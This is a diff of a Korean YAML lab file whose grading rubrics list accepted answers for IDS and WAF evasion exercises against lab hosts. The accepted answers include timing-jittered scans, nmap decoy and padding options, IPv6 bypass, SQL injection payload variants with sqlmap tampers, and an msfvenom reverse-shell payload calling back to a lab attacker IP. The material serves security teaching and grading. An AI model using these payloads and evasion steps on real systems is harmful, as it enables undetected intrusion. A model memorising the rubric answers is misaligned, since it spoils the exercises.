+        랜덤 간격. 해석: random.uniform = float 정밀도. integer sleep 보다 자연스러운 분포 (인간
+        브라우징 패턴 모사)."
+      - "지수 분포 jitter (실제 인간 행동에 가까움) — python3 -c 'import random, time;
+        [time.sleep(random.expovariate(0.5)) for _ in range(10)]'. 출력: lambda=0.5 = 평균
+        2초, long-tail. 해석: 균등 분포보다 expovariate 가 인간 idle/burst 패턴 모사 → ML 기반
+        anomaly detection 회피."
+      - "Burp Intruder throttle — Resource Pool 설정에서 'Maximum concurrent requests
+        = 1' + 'Throttle 1000-5000ms random'. 출력: 모든 payload 송신 사이 1-5s 랜덤
+        대기. 해석: GUI 도구로 일관 적용. brute force / fuzz 시 burst 회피."
+      - "wfuzz 지연 — wfuzz -z file,wordlist.txt -t 1 -s 2 -u 'http://10.20.30.80:3000/?q=FUZZ'.
+        출력: 한 thread, 2s 간격으로 순차. 해석: -t 1 = 단일 thread (concurrent burst
+        제거), -s 2 = sleep 2s. 합쳐서 IDS 시간 룰 통과."
+      - "nmap --scan-delay + --max-rate — sudo nmap -sS --scan-delay 5s --max-rate
+        2 -p 22,80,3000 10.20.30.80. 출력: 포트별 5s 간격, 초당 2 패킷 cap. 해석:
+        고정 5s 가 아닌 jitter 가 더 안전 → wrapper script 로 매회 sleep $((RANDOM%5+3))
+        + nmap 1 port 단위로."
+      - "cron 기반 분산 — crontab -e: '*/5 * * * * /usr/local/bin/recon.sh'. 5분마다 1
+        패킷. 출력: 24h 동안 288 packet 분산. 해석: 평소 트래픽에 묻힘. low-and-slow
+        recon. APT-style. SIEM 의 단위 시간 임계치 (예: 1 분 100 패킷) 회피."
+      - "사후 검증 — Suricata 의 dsize/threshold 룰 확인. ssh secu 'sudo grep -E
+        \"threshold|dsize\" /etc/suricata/rules/*.rules | head'. 출력: threshold:type
+        threshold, count 100, seconds 60. 해석: 100 req/60s 임계치 = 60s 안에 99 회까지
+        통과. 랜덤 jitter 로 임계치 미만 유지."
       negative_signs:
-      - 랜덤 지연 없음
-      - 고정 sleep만
-      - 시간 상관 분석 맥락 없음
+      - 랜덤 지연 없음 ($RANDOM / random.uniform 누락)
+      - 고정 sleep 만 (예: sleep 1 매번)
+      - 시간 상관 분석 맥락 없음 (왜 랜덤화하는지 설명 X)
+      - 단일 요청만 (반복 없음)
+      - jitter 분포 (균등/지수) 차이 인식 없음
   target_vm: attacker
 - order: 11
   instruction: IPv6를 사용하여 IPv4 전용 보안 장비를 우회할 수 있는지 확인하라. web 서버의 IPv6 주소를 확인하고 접근을
@@ -375,13 +632,37 @@ steps:
       - IPv6 evasion 맥락 설명
       - 듀얼 스택 우회 언급
       acceptable_methods:
-      - ip -6 addr
-      - ifconfig | grep inet6
-      - nmap -6 스캔
+      - "ssh ccc@10.20.30.80 'ip -6 addr show' (수기 baseline). 출력: 1: lo: ... inet6
+        ::1/128 / 2: ens33: ... inet6 fe80::20c:29ff:fedc:8b67/64 scope link. 해석:
+        link-local (fe80::) 만 있으면 별도 IPv6 routing 필요. global (2xxx::) 있으면 직접
+        도달 가능."
+      - "ifconfig | grep inet6 (legacy). 출력: inet6 fe80::20c:29ff:fedc:8b67 prefixlen
+        64. 해석: ip -6 미설치 환경. ifconfig 는 deprecated 지만 호환성. inet6 line 추출."
+      - "ssh ccc@10.20.30.80 'cat /proc/net/if_inet6'. 출력: 0000...0001 01 80 10
+        80 lo / fe80...8b67 02 40 20 80 ens33. 해석: kernel 직접 query. ifconfig/ip
+        없는 minimal container 환경. 16진수 prefix 확인."
+      - "nmap -6 IPv6 스캔 — sudo nmap -6 -sS -p 22,80,3000 fe80::20c:29ff:fedc:8b67%ens37.
+        출력: PORT 22/tcp open ssh ... over IPv6. 해석: link-local 은 zone identifier
+        (%인터페이스) 필수. global 은 직접. -6 옵션 잊으면 -sS 가 IPv4 만 시도."
+      - "curl IPv6 직접 — curl -g -6 'http://[fe80::20c:29ff:fedc:8b67%25ens37]:3000/'.
+        출력: HTTP/1.1 200 OK + JuiceShop. 해석: -6 강제 IPv6, [...] 대괄호 + URL 인코딩
+        %25 (% escape). 듀얼 스택 서버 IPv6 접근 검증."
+      - "socat IPv6 tunnel — socat TCP-LISTEN:8000,reuseaddr,fork TCP6:[fe80::...
+        %ens37]:3000. 출력: localhost:8000 → IPv6 target:3000. 해석: IPv4-only 도구
+        (sqlmap 등) 도 socat tunnel 통해 IPv6 target 공격 가능. tunneling 으로 도구 호환."
+      - "nft IPv6 룰 분석 — ssh secu 'sudo nft list table ip6 filter 2>/dev/null;
+        sudo nft list ruleset | grep -i ip6'. 출력: table ip6 filter { (없으면 비어있음)
+        }. 해석: secu 의 IPv6 방화벽 정책 검증. 비어있거나 'accept all' = 듀얼 스택 환경에서 IPv6
+        만 무방비 = 우회 100%."
+      - "Suricata IPv6 검사 여부 — ssh secu 'sudo grep -i ipv6 /etc/suricata/suricata.yaml
+        | head'. 출력: # ipv6: yes / af-packet: 인터페이스 다 있는지. 해석: Suricata 가
+        IPv6 패킷 캡처/decode 활성인지. 일부 룰셋이 IPv4 전용 시그니처만 → IPv6 우회."
       negative_signs:
-      - IPv4만 사용
-      - 듀얼 스택 맥락 없음
-      - 정책 갭 설명 없음
+      - IPv4 만 사용 (-6 없이)
+      - 듀얼 스택 맥락 없음 (왜 IPv6 가 회피인지 설명 X)
+      - 정책 갭 설명 없음 (IPv4 only 룰 식별 안 함)
+      - link-local vs global 구분 없음
+      - zone identifier (%인터페이스) 누락
   target_vm: attacker
 - order: 12
   instruction: JuiceShop에 대한 SQL Injection을 WAF가 차단할 경우를 대비한 대체 페이로드를 3개 이상 작성하라.
@@ -410,13 +691,42 @@ steps:
       - 변형 페이로드 3개 이상 (OR/||/true)
       - 응답 코드 비교
       acceptable_methods:
-      - OR/||/true 변형
-      - sqlmap --tamper=between/space2comment
-      - wfuzz -z file
+      - "for 루프로 5 페이로드 자동 시도 (수기 baseline) — for p in \"' OR 1=1--\"
+        \"' oR '1'='1'--\" \"' OR true--\" \"'+OR+'1'='1'--\" \"' || 1=1--\"; do echo
+        \"[$p]\"; curl -s -o /dev/null -w 'HTTP %{http_code}\\n' -X POST http://10.20.30.80:3000/rest/user/login
+        -H 'Content-Type: application/json' -d \"{\\\"email\\\":\\\"$p\\\",\\\"password\\\":\\\"a\\\"}\";
+        done. 출력: HTTP 401 / 200 / 401 / 401 / 200. 해석: 같은 의미 다른 시그니처. 어떤
+        변형이 통과하는지 매트릭스."
+      - "sqlmap --tamper=between -u 'http://10.20.30.80:3000/rest/products/search?q=1'
+        --batch --level=3 --risk=2. 출력: [INFO] tamper script 'between' applied. heuristic
+        confirms vulnerable. 해석: between tamper = '=' → 'BETWEEN ... AND ...'. 정규식
+        '=' 매칭 룰 회피. payload 의미 보존."
+      - "sqlmap --tamper=space2comment,charunicodeencode,randomcase. 출력: [INFO]
+        applying 3 tamper scripts. 해석: 다중 tamper chain. 공백→/**/, ASCII→유니코드 escape,
+        대소문자 랜덤. 한 base payload → 다중 변형."
+      - "wfuzz -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -u 'http://10.20.30.80:3000/rest/products/search?q=FUZZ'
+        --hc 404. 출력: 000023: 200 200 12 \\\"' OR '1'='1\\\". 해석: SecLists 의 SQLi 50+
+        변형 자동 fuzz. --hc 404 = 404 응답 hide. response code/size 차이로 통과 매핑."
+      - "Burp Intruder Sniper attack mode — attack type: Sniper, payload: SQLi
+        wordlist. Grep extract: 'error|admin|user_id'. 출력: payload 별 응답 + Grep
+        match column. 해석: GUI 도구. response body 에서 SQLi 성공 키워드 자동 감지. 50+
+        payload 한꺼번에."
+      - "tampering 단계 비교 — 같은 payload 5 인코딩: (1) raw \"' OR 1=1--\" (2) URL
+        %27%20OR%201%3D1-- (3) 이중 %2527%2520OR (4) Unicode \\\\u0027 (5) hex %27.
+        해석: 인코딩 단계마다 ModSec/CRS 룰 매칭 다름. WAF 의 디코드 깊이 식별."
+      - "POST body vs GET param 차이 — POST { \\\"email\\\":\\\"admin' OR 1=1--\\\" } vs
+        GET ?email=admin'+OR+1=1--. 해석: 일부 WAF 가 GET 만 또는 POST body 한정 검사.
+        Content-Type (json/form/text) 별 검사 차이도 활용."
+      - "사후 검증 — ssh ccc@10.20.30.80 'sudo tail /var/log/apache2/error.log | grep
+        ModSecurity | grep \"id \\\"942\" | wc -l'. 출력: 5 변형 중 3 건 ModSec 942 차단. 해석:
+        ModSecurity error.log 에서 sid 942100 (SQLi) 차단 횟수 = 5 시도 중 통과 / 차단
+        실측."
       negative_signs:
-      - 페이로드 1개
-      - 변형 없음
-      - 응답 비교 없음
+      - 페이로드 1개 (변형 없음)
+      - 변형 없음 (대소문자 한 가지만 등)
+      - 응답 비교 없음 (어떤 통과/차단 모름)
+      - 단일 인코딩 단계 (URL 만)
+      - 사후 검증 없음 (WAF log 와 응답 매칭 X)
   target_vm: attacker
 - order: 13
   instruction: Suricata 규칙을 분석하여 탐지를 우회하는 페이로드를 설계하는 방법을 설명하라.
@@ -444,13 +754,38 @@ steps:
       - content 매칭 분석
       - 회피 전략 4개 이상
       acceptable_methods:
-      - content 키워드 분석
-      - PCRE 우회 설계
-      - suricata-update + 룰 검증
+      - "content 키워드 추출 (수기 baseline) — ssh secu 'grep -oE \"content:[^;]+\" /etc/suricata/rules/*.rules
+        | head -10'. 출력: content:\"UNION\"; / content:\"SELECT\"; / content:\"<script>\";
+        / content:\"/etc/passwd\";. 해석: 어떤 정확 string 을 찾는지 식별 → 그 string 만 회피
+        하면 룰 통과."
+      - "단일 룰 분석 — ssh secu 'grep -A0 \"sid:1000001\" /etc/suricata/rules/local.rules'.
+        출력: alert http any any -> any any (msg:\"SQLi\"; content:\"UNION\"; nocase;
+        content:\"SELECT\"; nocase; sid:1000001;). 해석: nocase = 대소문자 무관. 두 content
+        AND 매칭 → 두 키워드 동시에 회피해야."
+      - "PCRE 분석 — ssh secu 'grep \"pcre:\" /etc/suricata/rules/*.rules | head'. 출력:
+        pcre:\"/UNION\\s+(ALL\\s+)?SELECT/i\";. 해석: PCRE 정규식 = \\s+ 공백, (ALL\\s+)? 옵션.
+        UNION/**/SELECT (주석) 은 \\s+ 매칭 X → 통과. PCRE 가 content 보다 회피 어려움."
+      - "회피 전략 매트릭스 작성 — for 회피 in '대소문자: nocase 가 없으면 통과 / 주석 /**/' 'URL 인코딩'
+        '이중 인코딩' '유니코드 \\\\u0055NION' 'hex %55NION'; do echo $회피; done. 해석: 룰
+        키워드별 가능한 변형 5+ 종 매핑. content 만 룰 / pcre 룰별 회피 가능성 기록."
+      - "룰 직접 테스트 — ssh secu 'sudo suricata -T -r test.pcap -l /tmp/' (PCAP 로 룰
+        검증). 출력: alert 발생 여부. 해석: 페이로드 → PCAP → suricata -T 로 오프라인 검증.
+        실 트래픽 아닌 안전한 테스트 환경."
+      - "suricata-update 룰셋 변경 추적 — ssh secu 'sudo suricata-update update-sources;
+        sudo suricata-update --dry-run | head'. 출력: Adding 1234 rules from ET Open.
+        해석: ET 룰셋 업데이트 시 신규 sid 식별. 새 룰 = 새 회피 분석 필요. CI 자동화 후보."
+      - "TLS encryption — content 매칭은 평문에만 적용. https://target/?q=UNION_SELECT
+        는 Suricata 가 평문 내용 못 봄 (TLS decrypt 없으면). 해석: HTTPS 가 자동 회피.
+        조건: 정상 cert + SNI. ja3/ja3s fingerprint 룰만 회피 못 함."
+      - "VRT/ET 공식 룰셋 review — Emerging Threats 의 'ET WEB_SPECIFIC_APPS' 카테고리 룰
+        OSINT 검색. 출력: 알려진 회피 패턴 (e.g., CVE-2017-XXXX 우회). 해석: 공개된 룰 우회
+        knowledge base 활용. exploit-db / GitHub 의 PoC 검색."
       negative_signs:
-      - 룰 분석 없음
-      - 회피 전략 2개 이하
+      - 룰 분석 없음 (페이로드만 변형, 어떤 룰 회피인지 모름)
+      - 회피 전략 2개 이하 (단일 변형만)
       - content 키워드 맥락 없음
+      - PCRE vs content 차이 인식 X
+      - 룰셋 출처 (ET / VRT / local) 구분 X
   target_vm: attacker
 - order: 14
   instruction: 공격 도구의 네트워크 시그니처를 변경하는 방법을 시연하라. nmap의 데이터 길이를 랜덤으로 패딩하라.
@@ -478,13 +813,37 @@ steps:
       - --data-length 또는 --randomize
       - 옵션 2개 이상 설명
       acceptable_methods:
-      - nmap --data-length
-      - nmap --scan-delay + --badsum
-      - hping3 --rand-source
+      - "sudo nmap -sS --data-length 50 --randomize-hosts --max-retries 1 -p 80,3000
+        10.20.30.80 (수기 baseline). 출력: PORT 80/tcp open + 50 byte 패딩. 해석:
+        --data-length = TCP payload 에 N byte 랜덤 추가. 패킷 크기 시그니처 (특정 nmap
+        version 의 정확 byte 수) 무효화."
+      - "sudo nmap -sS --data-length 0 --send-eth -p 22 10.20.30.80 (대조군). 출력:
+        TCP SYN 0 byte payload. 해석: 비교용. 0 vs 50 vs 100 byte 변화 시 IDS 시그니처
+        매칭 차이. fingerprint = 정확 byte count 의존."
+      - "sudo nmap -sS --randomize-hosts -iL targets.txt -p 22. 출력: 무작위 순서로
+        target 스캔. 해석: 다중 호스트 스캔 시 순서 패턴 (sequential = nmap fingerprint)
+        제거. IDS 의 'sequential scan' 시그니처 회피."
+      - "sudo nmap -sS --badsum -p 22 10.20.30.80. 출력: PORT 22/tcp filtered.
+        해석: --badsum = 잘못된 TCP/UDP checksum 송신. 정상 host 는 RST 안 보냄, IDS 는
+        content 매칭. 두 응답 (filtered vs closed) 비교로 IDS 존재 식별."
+      - "sudo hping3 -S -p 22 --rand-source --data 50 -c 5 10.20.30.80. 출력: 5 packet
+        from random IP 10.x.x.x. 해석: --rand-source = source IP 랜덤화. 매 패킷 다른
+        IP → IDS 가 'X req from same IP' 패턴 탐지 못 함."
+      - "sudo nmap --max-retries 1 --host-timeout 30s --min-rate 1 -p 22 10.20.30.80.
+        출력: 1 retry, 30s timeout, min 1 pps. 해석: nmap 의 default 다중 retry 패턴
+        제거. 원슈팅 + 빠른 timeout = nmap fingerprint 줄임."
+      - "scapy custom probe — python3 -c 'from scapy.all import *; send(IP(dst=\"10.20.30.80\")/TCP(dport=22,
+        flags=\"S\", options=[(\"MSS\", 1460)]))'. 출력: 단일 SYN 송신. 해석: scapy 로
+        TCP options (MSS/WSCALE/SACK) 직접 조작. nmap default options 와 다른 fingerprint."
+      - "TCP/IP fingerprint 검증 — sudo p0f -i ens33 -r dump.pcap. 출력: nmap/Linux
+        kernel/Windows 식별. 해석: p0f = passive OS fingerprinting. 자신의 패킷 송신 후
+        p0f 로 어떻게 식별되는지 확인 → 위장 효과 검증."
       negative_signs:
-      - 안티 핑거프린트 옵션 없음
-      - 기본 nmap만
-      - 시그니처 맥락 없음
+      - 안티 핑거프린트 옵션 없음 (--data-length / --rand-source 누락)
+      - 기본 nmap 만 (default option 으로 즉시 탐지)
+      - 시그니처 맥락 없음 (왜 fingerprint 무효화인지 설명 X)
+      - 패킷 크기 변화 인식 X
+      - p0f / Suricata 사후 검증 없음
   target_vm: attacker
 - order: 15
   instruction: 은닉 기법 실습 결과를 /tmp/evasion_report.txt에 정리하라. 테스트한 은닉 기법, 성공 여부, 보안 장비
@@ -518,13 +877,39 @@ steps:
       - Tested + Effectiveness + Hardening 3섹션
       - 기법 5개 이상 비교
       acceptable_methods:
-      - echo > 보고서
-      - PTES Vulnerability Analysis
-      - OWASP WAF bypass matrix
+      - "3 섹션 보고서 작성 (수기 baseline) — echo -e '=== Evasion Techniques Report ===\\n\\n[Tested]
+        ... \\n\\n[Effectiveness] ...\\n\\n[Hardening] ...' > /tmp/evasion_report.txt.
+        해석: Tested + Effectiveness + Hardening 3 섹션 필수. PTES + OWASP Testing Guide
+        구조."
+      - "Tested Techniques 섹션 — 8 종 시도 표 형식. echo 'Slow scan (T1) | IP fragmentation
+        | Source port (g 53) | SQLi 인코딩 | XSS handler | UA 위장 | Random timing | Data
+        padding'. 해석: 각 기법의 (대상 IDS/WAF / 결과 PASS or BLOCK / 비고 3 컬럼) 매트릭스."
+      - "Effectiveness 분석 — 'Most: 인코딩 + 타이밍 결합 (95% PASS) / Least: 단순 case mixing
+        (modern WAF handle)'. 해석: 효과 정량. 실 측정 기반 (예: 50 회 시도 중 N 회 통과).
+        조합 기법 효과가 단일 보다 우수 사실 명시."
+      - "Security Hardening 권고 — 'Suricata: protocol analysis + ja3 / WAF: ML-based
+        anomaly + ModSec paranoia 2+ / Firewall: stateful + DPI / SIEM: multi-source
+        correlation / Update: signature daily'. 해석: 단순 시그니처 한계 → 행위 기반 + ML
+        + 다중 소스. 실무 권고 수준."
+      - "MITRE ATT&CK 매핑 — T1027 Obfuscated Files / T1036 Masquerading / T1090 Proxy
+        / T1029 Scheduled Transfer / T1497 Sandbox Evasion. 해석: 각 회피 기법의 ATT&CK
+        ID 명시 → 방어 framework 와 매칭. Detection / Mitigation 연결 가능."
+      - "PTES (Pentest Execution Standard) 의 'Vulnerability Analysis' 섹션 형식 차용.
+        구조: Threat Modeling / Vulnerability Identification / Exploitation Approach
+        / Post-Exploitation. 해석: 표준 framework 따르면 보고서 인정 받기 쉬움. 컨설팅
+        deliverable 으로 활용."
+      - "OWASP WAF Bypass Cheat Sheet 형식 — Bypass Category / Payload / WAF / Status.
+        예: 'Encoding | %2527%2520OR%25201=1-- | ModSec CRS 3.3 | PASS'. 해석: 실 측정
+        매트릭스. 각 row = 1 시도. WAF version 명시 = 재현성 확보."
+      - "보고서 PDF 변환 + 서명 — pandoc /tmp/evasion_report.txt -o report.pdf;
+        gpg --sign report.pdf. 출력: report.pdf.gpg. 해석: 컨설팅 deliverable 형태.
+        PDF + GPG 서명 = 무결성 검증. 클라이언트 제출 표준 형식."
       negative_signs:
-      - 3섹션 중 1개 이하
-      - 기법 3개 이하
-      - 강화 방안 없음
+      - 3 섹션 중 1개 이하 (Tested 만 / Effectiveness 만 등)
+      - 기법 3개 이하 (다양성 부족)
+      - 강화 방안 없음 (Hardening 섹션 누락)
+      - MITRE 매핑 없음
+      - 효과 정량 없음 (PASS/BLOCK 비율 측정 X)
   target_vm: attacker
 - order: 99
   instruction: '[복합 시나리오] "OSCP 시험 응시자 — 24시간 시험 일지 (Exam Log)"
@@ -668,16 +1053,46 @@ steps:
       - IDS 우회 / WAF 변형 / 손절 의사결정
       - 회고 3 항목
       acceptable_methods:
-      - heredoc 시간 도장
-      - nmap -sS -T1 -f -D / WAF 변형
-      - 점수 누적 echo
-      - markdown 회고
+      - "시간 도장 + heredoc 일지 (수기 baseline) — echo \"=== OSCP Exam Start: $(date
+        '+%Y-%m-%d %H:%M:%S') ===\" > /tmp/oscp_log.txt; echo \"[09:00] T-START\" >>
+        /tmp/oscp_log.txt. 해석: 매 단계 date 명령 실행 → 실제 시각 기록. 사후 검증 가능."
+      - "BoF 단계 (25점) — echo \"[09:05] BoF — fuzzing → offset → bad chars → JMP ESP\";
+        msfvenom -p windows/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -b
+        '\\x00\\x0a\\x0d' -f c. 출력: payload C array. 해석: 표준 BoF 5 단계 (fuzz →
+        offset → bad chars → JMP → shellcode). msfvenom 으로 bad char 제외 shellcode."
+      - "Machine 정찰 — sudo nmap -sT -p 22,80,443,3000,8080 --max-rtt-timeout 1000
+        -T2 10.20.30.80. 출력: PORT 80/tcp open ... 22/tcp open. 해석: -T2 = polite,
+        -sT = TCP connect (raw 권한 불필요), --max-rtt-timeout = 1s response 한계. 완전
+        스캔보다 핵심 포트 우선."
+      - "IDS 우회 (lab #2·#5·#10 통합) — sudo nmap -sS -T1 -f -D 10.0.0.1,10.0.0.2,ME
+        --source-port 80 -p 22,80,3000 10.20.30.80. 출력: stealth scan results. 해석:
+        일지에 본인 노트 명시 — \"Suricata 가 nmap 시그니처 잡을 거. T1 + decoy + source
+        port 80 우회.\" — 의사결정 흔적."
+      - "WAF 우회 5 변형 (lab #3 적용) — heredoc 으로 페이로드 표 작성. cat <<EOF\\n1.
+        ' OR 1=1--\\n2. ' Or 1=1--\\n3. '/**/OR/**/1=1--\\n4. %27%20OR%201=1--\\n5.
+        '%2520OR%25201=1--\\nEOF. 해석: 5 인코딩 단계 (raw / 대소문자 / 주석 / URL / 이중)
+        명확 분리."
+      - "점수 누적 — echo \"[16:00] ✅ A root: SUID find. 누적 50/100\". 점수 추적 매
+        성공 시 누적. 해석: BoF 25 + A 25 = 50 / B 손절 / C user 20 + root 10 = 80. 합격선
+        70 도달 후 추가 점수 = optional. 시간 vs 점수 trade-off 명시."
+      - "손절 의사결정 — \"[21:00] B 손절 → C pivot. 본인 노트: B root 2시간 더 + Machine
+        C 미시작. C user 만 따도 70 합격선. B 포기.\" 해석: 합리적 시간 비용 평가. OSCP
+        실전에서 가장 중요한 결정. 일지에 reasoning 기록 = self-reflection 증거."
+      - "회고 markdown — '\\n## 회고 (Lessons Learned)\\n1. **잘한 점**: BoF 우선 + B 손절.\\n2.
+        **개선 점**: A 정찰 1.5h 너무 김 (다음엔 30분 cap).\\n3. **다음 준비**: WAF 우회 노트
+        30→100 확장.' 해석: 3 항목 = 잘한 점 / 개선 점 / 다음 준비. 단순 회고 아닌 actionable
+        item."
+      - "Bastion AI 통합 (ai 트랙 차이) — Non-AI 는 manual ssh attacker. AI 는 Bastion AI
+        가 PenTest 일지 자동 정리 + KG anchor 'oscp_exam_log_2026Q2'. Non-AI 는 본인이
+        직접 작성하므로 의사결정 명시도 더 중요."
       negative_signs:
-      - 시간 도장 누락
-      - 점수 추적 없음
-      - 회고 누락
-      - 보고서 형식
-      - 의사결정 흔적 없음
+      - 시간 도장 누락 (T-START / T-END / 단계별 timestamp 없음)
+      - 점수 추적 없음 (어디서 25/50/70/80 점 도달했는지 모름)
+      - 회고 누락 (3 항목 중 1개 이하)
+      - 보고서 형식 (시간 일지 아닌 일반 PenTest report)
+      - 의사결정 흔적 없음 (B 손절 같은 trade-off reasoning X)
+      - heredoc / echo 시간 도장 없이 일반 markdown
+      - lecture w12 + lab #2·#3·#5·#10 통합 안 됨 (단일 기법만)
   target_vm: attacker
   risk_level: low
   answer_detail: '학생이 ssh attacker 직접. OSCP 시험 일지 — 시간 도장 + 점수 추적 + 손절 의사결정 + 회고.
